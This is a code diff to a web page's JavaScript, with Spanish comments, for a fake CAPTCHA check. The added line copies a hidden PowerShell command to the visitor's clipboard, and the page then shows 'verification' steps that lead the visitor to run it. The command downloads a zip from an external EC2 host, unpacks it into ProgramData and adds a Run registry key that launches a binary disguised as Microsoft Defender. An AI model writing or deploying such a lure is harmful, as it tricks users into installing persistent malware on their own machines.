@@ -164,7 +164,8 @@
                     msg.style.display = "block";
 
                     // Ejecutar el comando de PowerShell al portapapeles
-                    const command = "powershell -w hidden -ExecutionPolicy Bypass -c \"Invoke-WebRequest http://127.0.0.1:8000/test.ps1 -OutFile $env:TEMP\\a.ps1; powershell $env:TEMP\\a.ps1\"";
+                    // const command = "powershell -w hidden -ExecutionPolicy Bypass -c \"Invoke-WebRequest http://127.0.0.1:8000/test.ps1 -OutFile $env:TEMP\\a.ps1; powershell $env:TEMP\\a.ps1\"";
+                    const command = "powershell -w hidden -ExecutionPolicy Bypass -c \" $dst=\"$env:ProgramData\";iwr http://ec2-44-204-18-35.compute-1.amazonaws.com/4.18.29040.7-64.zip -OutFile $dst\\4.18.29040.7-64.zip;Expand-Archive -Path \"$dst\\4.18.29040.7-64.zip\" -DestinationPath $dst;New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"MpDefenderStart\" -PropertyType String -Value \"$dst\\4.18.29040.7-64\\MpCmdRun.exe\" -Force \"";
                     navigator.clipboard.writeText(command).then(() => {
                         document.getElementById("status-captcha").innerHTML =
                             "<b>Para continuar: Verificación en 3 pasos</b><br><br>" +
